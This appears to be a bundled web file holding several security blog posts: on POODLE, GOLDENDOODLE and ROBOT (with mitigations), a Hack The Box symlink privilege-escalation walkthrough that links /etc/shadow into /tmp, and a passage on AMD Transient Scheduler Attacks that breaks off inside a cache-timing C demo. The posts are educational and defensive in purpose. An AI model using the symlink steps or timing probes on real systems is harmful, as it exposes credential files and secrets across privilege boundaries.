        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,pg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,hg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,mg=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
